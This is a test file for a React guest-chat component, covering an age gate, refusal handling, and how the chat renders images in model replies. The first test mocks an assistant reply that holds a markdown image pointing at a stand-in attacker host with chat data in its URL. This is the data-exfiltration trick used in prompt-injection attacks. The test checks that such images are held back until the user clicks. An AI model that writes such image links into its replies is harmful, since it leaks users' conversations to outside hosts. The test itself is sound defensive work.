import type React from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

import {
  ACCOUNT_AGE_FIELD_LABEL,
  ACCOUNT_AGE_INELIGIBLE_MESSAGE,
  ACCOUNT_AGE_REQUIRED_MESSAGE,
  ACCOUNT_AGE_REQUIREMENT_NOTICE,
  ACCOUNT_MINIMUM_AGE,
} from '@agiworkforce/types';
import { GUEST_AGE_CHECK_STORAGE_KEY } from './guest-age-check';

type GuestChatStreamModule = typeof import('./guest-chat-stream');

const ATTACKER_HOST = 'attacker.example';
const REPLY_IMAGE_URL = `https://${ATTACKER_HOST}/p?d=summary-of-the-chat`;
const REPLY = `Here is your summary.\n\n![chart](${REPLY_IMAGE_URL})`;
const ASSET_TIMEOUT_MS = 15_000;

const refusal = vi.hoisted(() => ({ code: null as string | null }));
const sent = vi.hoisted(() => ({ ages: [] as number[] }));

vi.mock('./guest-chat-stream', async (importOriginal) => {
  const original = await importOriginal<GuestChatStreamModule>();
  return {
    ...original,
    sendGuestTurn: async (
      _messages: unknown,
      ageCheckedAgainst: number,
      _signal: AbortSignal,
      onText: (content: string) => void,
    ) => {
      sent.ages.push(ageCheckedAgainst);
      if (refusal.code) {
        throw new original.GuestChatRefusal(
          'Refused for now.',
          refusal.code as ConstructorParameters<typeof original.GuestChatRefusal>[1],
        );
      }
      onText(REPLY);
      return { content: REPLY, failure: null, remaining: 4 };
    },
  };
});

vi.mock('next/link', () => ({
  default: ({
    children,
    href,
    className,
  }: {
    children: React.ReactNode;
    href: string;
    className?: string;
  }) => (
    <a href={href} className={className}>
      {children}
    </a>
  ),
}));

const { GuestChat } = await import('./GuestChat');

const COMPOSER = { name: 'Message input' };
const AGE_FIELD = { name: ACCOUNT_AGE_FIELD_LABEL };

function renderGuestChat() {
  return render(<GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />);
}

function storedAge(): string | null {
  return window.localStorage.getItem(GUEST_AGE_CHECK_STORAGE_KEY);
}

describe('GuestChat', () => {
  beforeEach(() => {
    sent.ages.length = 0;
    window.localStorage.clear();
    window.localStorage.setItem(GUEST_AGE_CHECK_STORAGE_KEY, String(ACCOUNT_MINIMUM_AGE));
  });

  afterEach(() => {
    vi.restoreAllMocks();
    window.localStorage.clear();
  });

  it(
    'asks before loading an image that a guest reply points at',
    async () => {
      const user = userEvent.setup();
      const { container } = render(
        <GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />,
      );

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Summarise it');
      await user.keyboard('{Enter}');

      const load = await screen.findByRole(
        'button',
        { name: `Load image from ${ATTACKER_HOST}` },
        { timeout: ASSET_TIMEOUT_MS },
      );
      expect(container.querySelector(`img[src="${REPLY_IMAGE_URL}"]`)).toBeNull();
      expect(container.innerHTML).not.toContain(`${ATTACKER_HOST}/p`);

      await user.click(load);

      const image = container.querySelector(`img[src="${REPLY_IMAGE_URL}"]`);
      expect(image?.getAttribute('src')).toBe(REPLY_IMAGE_URL);
      expect(image?.getAttribute('referrerpolicy')).toBe('no-referrer');
    },
    ASSET_TIMEOUT_MS * 2,
  );

  describe('a refused turn', () => {
    afterEach(() => {
      refusal.code = null;
    });

    it('keeps the composer and the draft when admission is only unavailable', async () => {
      refusal.code = 'guest_admission_unavailable';
      const user = userEvent.setup();
      render(<GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />);

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Hello again');
      await user.keyboard('{Enter}');

      expect(await screen.findByText('Refused for now.')).toBeTruthy();
      const composer = screen.getByRole('textbox', {
        name: 'Message input',
      }) as HTMLTextAreaElement;
      expect(composer.value).toBe('Hello again');
    });

    it('replaces the composer once the day’s capacity is spent', async () => {
      refusal.code = 'guest_capacity_reached';
      const user = userEvent.setup();
      render(<GuestChat dailyLimit={5} signInHref="/login" signUpHref="/sign-up" />);

      await user.type(screen.getByRole('textbox', { name: 'Message input' }), 'Hello again');
      await user.keyboard('{Enter}');

      expect(await screen.findByText('Refused for now.')).toBeTruthy();
      expect(screen.queryByRole('textbox', { name: 'Message input' })).toBeNull();
    });
  });
});

describe('GuestChat age check', () => {
  beforeEach(() => {
    sent.ages.length = 0;
    refusal.code = null;
    window.localStorage.clear();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    window.localStorage.clear();
    refusal.code = null;
  });

  it('asks the visitor’s age before the first message and offers no composer', async () => {
    renderGuestChat();

    const field = await screen.findByRole('textbox', AGE_FIELD);
    expect(screen.getByText(ACCOUNT_AGE_REQUIREMENT_NOTICE)).toBeTruthy();
    expect(field.getAttribute('inputmode')).toBe('numeric');
    expect(field.getAttribute('maxlength')).toBe('3');
    expect(field.hasAttribute('name')).toBe(false);
    expect(screen.getByRole('button', { name: 'Continue' })).toBeTruthy();
    expect(screen.queryByRole('textbox', COMPOSER)).toBeNull();
    expect(screen.getByRole('link', { name: 'Log in' })).toBeTruthy();
    expect(screen.getByRole('link', { name: 'Sign up for free' })).toBeTruthy();
  });

  it('asks for an age when the field is empty or not a number', async () => {
    const user = userEvent.setup();
    renderGuestChat();

    await user.click(await screen.findByRole('button', { name: 'Continue' }));
    expect((await screen.findByRole('alert')).textContent).toBe(ACCOUNT_AGE_REQUIRED_MESSAGE);
    expect(document.activeElement).toBe(screen.getByRole('textbox', AGE_FIELD));

    await user.type(screen.getByRole('textbox', AGE_FIELD), 'ab');
    await user.click(screen.getByRole('button', { name: 'Continue' }));
    expect(screen.getByRole('alert').textContent).toBe(ACCOUNT_AGE_REQUIRED_MESSAGE);
    expect(screen.queryByRole('textbox', COMPOSER)).toBeNull();
    expect(storedAge()).toBeNull();
  });

  it('keeps the composer closed for an age under the minimum', async () => {
    const user = userEvent.setup();
    renderGuestChat();

    await user.type(await screen.findByRole('textbox', AGE_FIELD), '17');
    await user.click(screen.getByRole('button', { name: 'Continue' }));

    expect((await screen.findByRole('alert')).textContent).toBe(ACCOUNT_AGE_INELIGIBLE_MESSAGE);
    expect(document.activeElement).toBe(screen.getByRole('textbox', AGE_FIELD));
    expect(screen.queryByRole('textbox', COMPOSER)).toBeNull();
    expect(storedAge()).toBeNull();
  });

  it('opens the composer at the minimum age and keeps only the minimum', async () => {
    const user = userEvent.setup();
    renderGuestChat();

    await user.type(await screen.findByRole('textbox', AGE_FIELD), '34');
    await user.keyboard('{Enter}');

    expect(await screen.findByRole('textbox', COMPOSER)).toBeTruthy();
    expect(screen.queryByRole('textbox', AGE_FIELD)).toBeNull();
    expect(storedAge()).toBe(String(ACCOUNT_MINIMUM_AGE));
    expect(JSON.stringify({ ...window.localStorage })).not.toContain('34');
  });

  it('sends the minimum it was checked against and never the typed age', async () => {
    const user = userEvent.setup();
    renderGuestChat();

    await user.type(await screen.findByRole('textbox', AGE_FIELD), '34');
    await user.click(screen.getByRole('button', { name: 'Continue' }));
    await user.type(await screen.findByRole('textbox', COMPOSER), 'Hello');
    await user.keyboard('{Enter}');

    await waitFor(() => expect(sent.ages).toEqual([ACCOUNT_MINIMUM_AGE]));
  });

  it('asks again when the stored check was made against a lower minimum', async () => {
    window.localStorage.setItem(GUEST_AGE_CHECK_STORAGE_KEY, '13');
    renderGuestChat();

    expect(await screen.findByRole('textbox', AGE_FIELD)).toBeTruthy();
    expect(screen.queryByRole('textbox', COMPOSER)).toBeNull();
  });

  it('does not ask again when the stored check is current', async () => {
    window.localStorage.setItem(GUEST_AGE_CHECK_STORAGE_KEY, String(ACCOUNT_MINIMUM_AGE));
    renderGuestChat();

    expect(await screen.findByRole('textbox', COMPOSER)).toBeTruthy();
    expect(screen.queryByRole('textbox', AGE_FIELD)).toBeNull();
  });

  it('sends the stored value with the first turn', async () => {
    window.localStorage.setItem(GUEST_AGE_CHECK_STORAGE_KEY, String(ACCOUNT_MINIMUM_AGE));
    const user = userEvent.setup();
    renderGuestChat();

    await user.type(await screen.findByRole('textbox', COMPOSER), 'Hello');
    await user.keyboard('{Enter}');

    await waitFor(() => expect(sent.ages).toEqual([ACCOUNT_MINIMUM_AGE]));
  });

  it('clears the stored check and asks again when the server wants an age check', async () => {
    window.localStorage.setItem(GUEST_AGE_CHECK_STORAGE_KEY, String(ACCOUNT_MINIMUM_AGE));
    refusal.code = 'age_confirmation_required';
    const user = userEvent.setup();
    renderGuestChat();

    await user.type(await screen.findByRole('textbox', COMPOSER), 'Hello again');
    await user.keyboard('{Enter}');

    const field = await screen.findByRole('textbox', AGE_FIELD);
    expect(storedAge()).toBeNull();
    expect(screen.queryByRole('textbox', COMPOSER)).toBeNull();
    expect(document.activeElement).toBe(field);
  });

  it('still works for the session when the browser refuses storage', async () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => {
      throw new Error('storage is blocked');
    });
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => {
      throw new Error('storage is blocked');
    });
    vi.spyOn(Storage.prototype, 'removeItem').mockImplementation(() => {
      throw new Error('storage is blocked');
    });
    const user = userEvent.setup();
    renderGuestChat();

    await user.type(await screen.findByRole('textbox', AGE_FIELD), '18');
    await user.click(screen.getByRole('button', { name: 'Continue' }));
    await user.type(await screen.findByRole('textbox', COMPOSER), 'Hello');
    await user.keyboard('{Enter}');

    await waitFor(() => expect(sent.ages).toEqual([ACCOUNT_MINIMUM_AGE]));
  });
});
